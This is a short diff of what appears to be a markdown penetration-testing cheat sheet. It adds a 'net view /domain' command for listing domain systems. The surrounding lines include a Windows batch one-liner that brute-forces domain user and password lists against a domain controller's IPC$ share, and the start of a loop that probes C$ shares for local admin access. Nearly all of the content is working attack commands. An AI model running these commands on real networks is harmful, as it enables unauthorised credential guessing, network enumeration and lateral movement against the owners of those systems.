@@ -141,6 +141,11 @@ $month$year
 
 `@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL`
 
+
+### all systems
+
+`net view /domain > systems.txt`
+
 ### Local admin search using net use
 
 `@FOR /F %s in (systems.txt) DO @net use \\%s\C$ /user:domain\username  
